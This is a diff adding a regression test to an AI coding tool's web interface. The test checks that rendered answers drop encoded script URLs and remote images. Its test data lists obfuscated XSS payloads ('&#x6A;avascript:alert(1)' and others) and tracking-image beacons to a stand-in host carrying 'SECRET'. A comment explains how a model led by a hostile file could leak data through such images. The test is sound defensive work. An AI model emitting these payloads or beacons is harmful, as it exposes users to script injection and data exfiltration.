@@ -2167,3 +2167,77 @@ test('a tool call being written is drawn at its first fragment and grows in plac
     double.server.close()
   }
 })
+
+/**
+ * The URLs a page would follow in rendered markup, read as the browser reads them: numeric references and the
+ * ASCII-named ones a scheme can hide behind are decoded, tab and newline dropped, the ends trimmed.
+ */
+function followedUrls(html) {
+  const named = { Tab: '\t', NewLine: '\n', colon: ':', sol: '/', amp: '&', quot: '"', apos: "'", num: '#', quest: '?', period: '.', lt: '<', gt: '>', commat: '@' }
+  const decode = (value) =>
+    value.replace(/&(?:#(?:[xX]([0-9a-fA-F]+)|([0-9]+));?|([A-Za-z][A-Za-z0-9]*);)/g, (whole, hex, decimal, name) => {
+      if (name !== undefined) return named[name] ?? whole
+      const code = hex !== undefined ? Number.parseInt(hex, 16) : Number.parseInt(decimal, 10)
+      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '\ufffd'
+    })
+  return [...html.matchAll(/\s(href|src)="([^"]*)"/g)].map(([, attribute, value]) => ({
+    attribute,
+    url: decode(value).replace(/[\t\n\r]/g, '').replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, ''),
+  }))
+}
+
+test('an answer carries neither a hidden script link nor a remote image, as the server renders it for the page', async (context) => {
+  if (!skipUnless(context, /web/.test((await runCli(['--help'])).stdout), CAPABILITY)) return
+  /**
+   * Live issues developer-two-6 and developer-two-7 (both P0, measured on 8082 and 3097 on 2026-10-29). The page sets
+   * an answer's server-rendered HTML with innerHTML. A raw-HTML link whose scheme hid behind character references
+   * (`&#x6A;avascript:`, `java&#x09;script:`, `javascript&colon;`, `&#x64;ata:`) passed both sanitisers and decoded in
+   * the browser into a script URL: one click ran script in heddle's origin. A remote image was fetched as soon as the
+   * answer was drawn, with no click, so a model led by a hostile file could send out what it had read.
+   */
+  const hidden = [
+    '&#x6A;avascript:alert(1)', '&#106;avascript:alert(1)', '&#0000106;avascript:alert(1)', 'java&#x09;script:alert(1)',
+    'java&Tab;script:alert(1)', 'javascript&colon;alert(1)', '&#x64;ata:text/html,x', '&#32;javascript:alert(1)', 'vb&#x73;cript:x',
+  ]
+  const remote = [
+    '![t](https://tracker.example/p.png?d=SECRET)', '<img src="https://tracker.example/p.png?d=SECRET">', '![t](//tracker.example/p.png)',
+    '<img src="&#x2F;&#x2F;tracker.example/p.png">', '<img src="http&#x3A;//tracker.example/p.png">',
+  ]
+  const answer = [
+    ...hidden.map((href, index) => `<a href="${href}">hidden ${index}</a>`),
+    ...remote,
+    '<a href="https://example.com/?a=1&amp;b=2">a real link</a>',
+    '![plot](/w/plot.png)',
+  ].join('\n\n')
+  const server = await startServer('answer-markup', [{ text: answer }])
+  try {
+    mkdirSync(server.work, { recursive: true })
+    const cookie = await cookieFor(server.url)
+    await api(server.url, cookie, '/api/workspaces', { method: 'POST', body: JSON.stringify({ path: server.work }) })
+    const opened = await api(server.url, cookie, '/api/folders/session', { method: 'POST', body: JSON.stringify({ folder: server.work }) })
+    const session = opened.body.session?.id ?? opened.body.id
+    const turn = await fetch(new URL('/api/turn', server.url), {
+      method: 'POST',
+      headers: { cookie, 'content-type': 'application/json' },
+      body: JSON.stringify({ prompt: 'answer with links', folder: server.work, session }),
+    })
+    assert.equal(turn.status, 200, `the turn ran (${turn.status})`)
+    await turn.text()
+    const detail = await api(server.url, cookie, `/api/sessions/${encodeURIComponent(session)}`)
+    const transcript = (detail.body.turns ?? []).filter((row) => row.kind === 'assistant').map((row) => row.html ?? '').join('\n')
+    assert.ok(transcript.includes('a real link'), `the transcript carries the answer's rendered HTML (${transcript.slice(0, 120)})`)
+    const rendered = await api(server.url, cookie, '/api/markdown', { method: 'POST', body: JSON.stringify({ text: answer }) })
+    assert.equal(rendered.status, 200, `the markdown route answers (${rendered.status})`)
+    for (const [where, html] of [['the transcript', transcript], ['POST /api/markdown', String(rendered.body.html ?? '')]]) {
+      const urls = followedUrls(html)
+      for (const { attribute, url } of urls) {
+        assert.doesNotMatch(url, /^(?:javascript|data|vbscript):/i, `${where}: no ${attribute} the browser decodes into a script or data URL (${url})`)
+        if (attribute === 'src') assert.doesNotMatch(url, /^(?:[a-z][a-z0-9+.-]*:)?\/\//i, `${where}: no image fetched from another host (${url})`)
+      }
+      assert.ok(urls.some(({ attribute, url }) => attribute === 'href' && url === 'https://example.com/?a=1&b=2'), `${where}: a real link is kept (${JSON.stringify(urls)})`)
+      assert.ok(urls.some(({ attribute, url }) => attribute === 'src' && url === '/api/raw?path=%2Fw%2Fplot.png'), `${where}: a local image is served by the file route (${JSON.stringify(urls)})`)
+    }
+  } finally {
+    await server.close()
+  }
+})
